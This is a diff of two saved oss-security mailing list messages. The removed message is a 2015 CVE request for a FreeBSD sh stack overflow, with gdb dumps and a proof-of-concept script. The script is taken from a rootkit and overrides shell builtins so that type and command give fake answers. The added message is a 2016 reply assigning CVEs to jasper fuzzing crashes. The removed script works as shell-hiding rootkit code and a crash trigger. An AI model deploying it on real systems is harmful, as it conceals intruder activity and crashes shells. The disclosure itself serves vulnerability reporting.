@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6296" "Tuesday" "31" "March" "2015" "18:42:01" "+0800" "wzt wzt" "wzt.wzt@gmail.com" "<CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw@mail.gmail.com>" "201" "[oss-security] CVE request: freebsd/sh stack overflow vulnerability" nil nil nil "3" "2015033110:42:01" "[oss-security] CVE request: freebsd/sh stack overflow vulnerability" (number mark "        wzt.wzt@gmai Mar 31  201/6296  " thread-indent "\"[oss-security] CVE request: freebsd/sh stack overflow vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2361" "Sunday" "16" "October" "2016" "10:23:43" "+0000" "Graham Christensen" "graham@grahamc.com" "<CAHapaJ1yTNVH+umS9U3SeW0jK73WY0H06_k0eJmJ3pnEVO9D+Q@mail.gmail.com>" "68" "Re: [oss-security] Re: Fuzzing jasper" "^Cc:" nil nil "10" "2016101610:23:43" "[oss-security] Re: Fuzzing jasper" (number mark "        graham@graha Oct 16   68/2361  " thread-indent "\"Re: [oss-security] Re: Fuzzing jasper\"\n") "<20161016030229.F231642E027@smtpvbsrv1.mitre.org>" ("<1528713.C8CqGc87r5@arcadia>" "<20161016030229.F231642E027@smtpvbsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 22043 invoked by uid 550); 31 Mar 2015 11:11:51 -0000
+Received: (qmail 25711 invoked by uid 550); 16 Oct 2016 13:30:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,226 +11,106 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 3788 invoked from network); 31 Mar 2015 10:42:13 -0000
+Received: (qmail 32666 invoked from network); 16 Oct 2016 10:24:06 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:date:message-id:subject:from:to:content-type;
-        bh=eXBUCabw5U5bQXG/aX+CMlmtkbQo49rj56eEyeNNY0M=;
-        b=q6wKgslr5CNfZJ592Xjd2X0oiydIeRE+JyhKur3mGGcNjE0nEFp2jAFVp2J+dYCBKg
-         DAfKOKi+8pMt7sfKSReT+Y9OdRCBzUVZLKLd6iArQHiqSqZWgS66gd7BSlHEapTOl27I
-         Z3ZNipI6OmGYf6jjxV/lueaHkFn1r4p4HuzNTzj+6HGkxISGC0xDs+s98GkRieB6PeX8
-         KFzfaIU5jJ+EEuMKtMLugqJJBfdSrDGnlf4IdCM6eOZJFuN8HZm18CpxV3/KyRs2Fi82
-         mRYoionJUz2pSr77veEEy3ylANzDxRWas8ywcrmW2b05JBGSFDmNDIPT9xCzey4BG9jV
-         wfMw==
+        d=grahamc.com; s=google;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
+         :cc;
+        bh=cYk3dVB+2o+qGN4GPbiCB7bwVFtI4gXyKI91aqZ9QuE=;
+        b=avFRqDfFm00JWNhU/i1KG5T4L6fEYUcFc22y/orzXmzhjd2K8oOS5n33NRM1f6rOQ9
+         SGlKFtyhTl9DE5L99CHZwFYp+c0B8XU5HDjJ4FHFy2354HWMwaI6ai/8kyLtgJDTgDgC
+         aUG7hJ1UeciyRK46VnRJCiyww4mIMXGpC1amo=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to:cc;
+        bh=cYk3dVB+2o+qGN4GPbiCB7bwVFtI4gXyKI91aqZ9QuE=;
+        b=SstLFKJaANKTKwZ79S7AvjpZGQTtizt4h7td3wat4FFWC9gLn5zE3BYd6oS0/hPhPR
+         Xcmz9LAosnxjqyT1a3NYSfaOM9qC7Ey6OBnYgaWLVgbTlI8OycxTNRrAYDa0dRPyijMQ
+         2EmG8h+d5LwfDxQTxk25ORUZU9SDTGBNcvbTwqEuQwu29OlHDitiazia+O/mEiztjzX9
+         2/nbVviRjQsj/oIryLBhcnAzKgyA4IhAdZGqnPFgTwn/FVaXXtDbGxouB8sSXDrFs30E
+         mNoXDypoLU+Oz37xmqHWygR59btdSRgro+cb5L5bAhNnxcSLjDgvk/o8dNVk5FWGFhHV
+         SySQ==
+X-Gm-Message-State: AA6/9RnbLGwEpX06Wr5v0Rddkv57TzyKVW2KcqdEjZ+3SjTP/EffbcZXDuugL3TGmYEImHTSdFBKjkSvqNeUjw==
+X-Received: by 10.31.158.20 with SMTP id h20mr11812354vke.110.1476613434131;
+ Sun, 16 Oct 2016 03:23:54 -0700 (PDT)
 MIME-Version: 1.0
-X-Received: by 10.112.137.164 with SMTP id qj4mr30258585lbb.17.1427798521964;
- Tue, 31 Mar 2015 03:42:01 -0700 (PDT)
-Message-ID: <CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw@mail.gmail.com>
-Content-Type: multipart/alternative; boundary=089e0115fd1cb66cfd0512933f8b
-Date: Tue, 31 Mar 2015 18:42:01 +0800
-From: wzt wzt <wzt.wzt@gmail.com>
+References: <1528713.C8CqGc87r5@arcadia> <20161016030229.F231642E027@smtpvbsrv1.mitre.org>
+In-Reply-To: <20161016030229.F231642E027@smtpvbsrv1.mitre.org>
+Message-ID: <CAHapaJ1yTNVH+umS9U3SeW0jK73WY0H06_k0eJmJ3pnEVO9D+Q@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=001a11427c36365807053ef8dba4
+Cc: cve-assign@mitre.org
+Date: Sun, 16 Oct 2016 10:23:43 +0000
+From: Graham Christensen <graham@grahamc.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE request: freebsd/sh stack overflow vulnerability
-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Re: Fuzzing jasper
+To: oss-security@lists.openwall.com, ago@gentoo.org
 
---089e0115fd1cb66cfd0512933f8b
+--001a11427c36365807053ef8dba4
 Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
 
-hi=EF=BC=9A
-    I found sh have a stack overflow bug on freebsd(9.0-10.0),  it may be
-triggered on all freebsd systems, but i have not tested yet. the poc below
-is tested on freebsd10.0 amd64 arch:
+For what it is worth, Jasper has recently issued a release fixing many
+CVEs, and would likely appreciate these fussing results as bug reports on
+their github project: https://github.com/mdadams/jasper/
+On Sat, Oct 15, 2016 at 11:21 PM <cve-assign@mitre.org> wrote:
 
-$ ls
-brootkit.sh
-$ . brootkit.sh
-$ command
-$ ls
-brootkit.sh     sh.core
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA256
+>
+> > AddressSanitizer: SEGV on unknown address
+> > 0x527ebf in bmp_getdata ...
+> jasper-1.900.1/src/libjasper/bmp/bmp_dec.c:383:5
+> >
+> > AddressSanitizer: SEGV on unknown address
+> > 0x528252 in bmp_getdata ...
+> jasper-1.900.1/src/libjasper/bmp/bmp_dec.c:385:5
+>
+> Use CVE-2016-8690 for both of these (the first and fifth items in the
+> http://www.openwall.com/lists/oss-security/2016/08/23/6 post).
+>
+>
+> > AddressSanitizer: FPE on unknown address
+> > 0x56de63 in jpc_dec_process_siz ...
+> jasper-1.900.1/src/libjasper/jpc/jpc_dec.c:1195:17
+>
+> Use CVE-2016-8691.
+>
+>
+> > AddressSanitizer: FPE on unknown address
+> > 0x56dee3 in jpc_dec_process_siz ...
+> jasper-1.900.1/src/libjasper/jpc/jpc_dec.c:1197:18
+>
+> Use CVE-2016-8692.
+>
+>
+> > AddressSanitizer: attempting double-free
+> > 0x51f8f8 in mem_close ...
+> jasper-1.900.1/src/libjasper/base/jas_stream.c:1073:3
+>
+> Use CVE-2016-8693.
+>
+> - --
+> CVE Assignment Team
+> M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+> [ A PGP key is available for encrypted communications at
+>   http://cve.mitre.org/cve/request_id.html ]
+> -----BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1
+>
+> iQIcBAEBCAAGBQJYAu2GAAoJEHb/MwWLVhi2D2wQAI6W9/5UOJJD9vMc25GdYVGo
+> Is0tX/21v2ibFpgyAAHBLaQd1ohNeu9U5Y6Nj9lAYAydmcoEZrXX9FxEMNp6XlI3
+> ybIDOapRLsjqLovdEzZUEnEDiHWAFS/t/p4hZv67PB7fHWKkeA3QhthSf3OlGVNm
+> IDQX8jMzhb96ZLS9aq5Hlz28K2z2Bx9j08WXQ0Fkp2ksMOCdNF0QwRp1TuA7Ork8
+> gtxNSVS+r8oAwWBH9fdwU8d9rgBoh0nkMVt9PJex5Hd4ys8CrOS6gBBc9HqDcxdc
+> bVdYRUuNbXJjZdlOcfQU37a6MyWJ0gCmCp6xs7u1joAnNmzT9C894xLInJFzx37n
+> JVqNBMltWgkkp1ClyVIdkRJErif2JstRpL59JBaMXgSRD0ZCZRsMrehc6SobX0A1
+> iUGxdjG/jpP7c8ZPaC2SS/1y0cEpP7CsbDFliZaGxt6QcKOfNqs33L3DSuc7qn0d
+> OJIH4GMNlZQFgf7+c67+ZSi86HVmTda9DJjm2a9uqU7tKKE/kJWC9OyWTef9K0aJ
+> 1HAu1yNjgGmc/oIIMCk/8wNO4UqlHiXhcF/kjWUBc4/eTAPxYLHSH5703HTStaVU
+> EN0ONeBMsfx6lhZgoJqDC+ItztjnDR90VGJyrH98XoEn+3KzjGkgEeaYv/N/mUfw
+> Q/58lzCKYeVI4ovM1u+J
+> =1lOZ
+> -----END PGP SIGNATURE-----
+>
 
-(gdb) x/16x $rsp+0x1b8
-0x7fffdfffeff8: Cannot access memory at address 0x7fffdfffeff8
-(gdb) x/16x $rsp+0x1c0
-0x7fffdffff000: 0x0000000000000000      0x0000000000000000
-0x7fffdffff010: 0x0000000000000000      0x0000000000000000
-0x7fffdffff020: 0x0000000000000000      0x0000000000000000
-0x7fffdffff030: 0x0000000000000000      0x0000000000000000
-0x7fffdffff040: 0x0000000000000000      0x0000000000000000
-0x7fffdffff050: 0x0000000000000000      0x0000000000000000
-0x7fffdffff060: 0x0000000000000000      0x0000000000000000
-0x7fffdffff070: 0x0000000000000000      0x0000000000000000
-
-(gdb) disass malloc malloc+32
-Dump of assembler code from 0x800d593f0 to 0x800d59410:
-0x0000000800d593f0 <malloc+0>:  push   %rbp
-0x0000000800d593f1 <malloc+1>:  mov    %rsp,%rbp
-0x0000000800d593f4 <malloc+4>:  push   %r15
-0x0000000800d593f6 <malloc+6>:  push   %r14
-0x0000000800d593f8 <malloc+8>:  push   %r13
-0x0000000800d593fa <malloc+10>: push   %r12
-0x0000000800d593fc <malloc+12>: push   %rbx
-0x0000000800d593fd <malloc+13>: sub    $0x488,%rsp
-0x0000000800d59404 <malloc+20>: mov    %rdi,-0x4a0(%rbp)
-0x0000000800d5940b <malloc+27>: mov    0x2c2dbe(%rip),%rax        #
-0x80101c1d0 <__nsdefaultsrc+4928>
-
-
-set $i=3D0
-set $addr=3D$rbp
-while ($i <=3D 1000)
-printf "frame[%d] 0x%lx =3D=3D> 0x%lx retaddr: 0x%lx\t diass: ", $i, $addr,
-*(long *)$addr, *(long *)($addr+8)
-x/i  *(long *)($addr+8)
-set $i=3D$i+1
-set $addr=3D*(long *)$addr
-end
-
-frame[98] 0x7fffe0004c00 =3D=3D> 0x7fffe0004d60 retaddr: 0x406465    diass:
-0x406465 <execve@plt+14073>:    incq   0x21d694(%rip)        # 0x623b00
-<environ+64>
-frame[99] 0x7fffe0004d60 =3D=3D> 0x7fffe0004e10 retaddr: 0x40513b    diass:
-0x40513b <execve@plt+9167>:     mov    -0x74(%rbp),%r14d
-frame[100] 0x7fffe0004e10 =3D=3D> 0x7fffe0004ec0 retaddr: 0x405118   diass:
-0x405118 <execve@plt+9132>:     cmpl   $0x0,0x21e9f5(%rip)        #
-0x623b14 <environ+84>
-
-poc:
-
-#!/bin/sh
-
-BR_ROOTKIT_PATH=3D"."
-
-builtin()
-{
-        local fake_a
-
-        unset command
-        case $1 in
-                "set"|"unset"|"command"|"type")
-                        fake_a=3D"$(command builtin $1 $2)"
-                        br_hide_engine "$fake_a"
-                        reset_command
-                        return ;;
-                "builtin")
-                        echo "sh: builtin: builtin: syntax error, sh is not
-support."
-                        reset_command
-                        return ;;
-                *)
-                        command builtin $1 $2
-                        reset_command
-                        ;;
-        esac
-}
-
-type()
-{
-        case $1 in
-                "builtin"|"set"|"unset"|"type")
-                        echo "$1 is a shell builtin"
-                        return ;;
-                "dir")
-                        echo "dir is /usr/bin/dir"
-                        return ;;
-                "ls")
-                        echo "ls is aliased to ls --color=3Dtty"
-                        return ;;
-                "ps")
-                        echo "ps is /bin/ps"
-                        return ;;
-                "netstat")
-                        echo "netstat is hashed (/usr/bin/netstat)"
-                        return ;;
-                "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/usr/bin/netstat")
-                        echo "$1 is $1"
-                        return ;;
-                *)
-                        unset command
-                        command type $1 $2
-                        reset_command
-                        return ;;
-        esac
-}
-
-fake_unset()
-{
-        case $1 in
-                "builtin"|"command"|"set"|"unset"|"type")
-                        echo "sh: syntax error, sh is not support."
-                        return ;;
-                *)
-                        unset $1 $2
-                        return ;;
-        esac
-}
-
-fake_command()
-{
-        case $1 in
-                "builtin"|"command"|"set"|"unset"|"type")
-                        echo "sh: syntax error, sh is not support."
-                        return ;;
-                *)
-                        unset command
-                        command $1 $2
-                        reset_command
-                        return ;;
-        esac
-}
-
-command()
-{
-        case $1 in
-                "builtin")
-                        builtin $2 $3
-                        return ;;
-                "unset")
-                        fake_unset $2 $3
-                        . $BR_ROOTKIT_PATH/brootkit.sh
-                        return ;;
-                "type")
-                        type $2 $3
-                        return ;;
-                "command")
-                        fake_command $2 $3
-                        return ;;
-                *)
-                        unset command
-                        command $2 $3
-                        . $BR_ROOTKIT_PATH/brootkit.sh
-                        return ;;
-        esac
-}
-
-reset_command()
-{
-        command()
-        {
-                case $1 in
-                        "builtin")
-                                builtin $2 $3
-                                return ;;
-                        "set")
-                                set $2 $3
-                                return ;;
-                        "unset")
-                                fake_unset $2 $3
-                                . $BR_ROOTKIT_PATH/brootkit.sh
-                                return ;;
-                        "type")
-                                type $2 $3
-                                return ;;
-                        "command")
-                                fake_command $2 $3
-                                return ;;
-                        *)
-                                unset command
-                                command $2 $3
-                                . $BR_ROOTKIT_PATH/brootkit.sh
-                                return ;;
-                esac
-        }
-}
-
---089e0115fd1cb66cfd0512933f8b--
+--001a11427c36365807053ef8dba4--
